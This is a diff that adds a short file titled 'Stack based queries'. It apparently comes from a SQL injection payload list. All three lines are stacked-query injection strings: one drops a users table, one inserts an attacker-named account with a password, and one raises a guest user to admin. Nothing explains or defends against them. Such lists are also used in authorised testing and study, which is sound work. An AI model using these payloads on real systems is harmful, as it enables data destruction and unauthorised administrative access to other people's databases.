@@ -1,0 +1,5 @@
+Stack based queries :~
+
+'; DROP TABLE users--
+'; INSERT INTO users('username','password') VALUES ('hacker','pass')--
+'; UPDATE users SET role='admin' WHERE username='guest'--
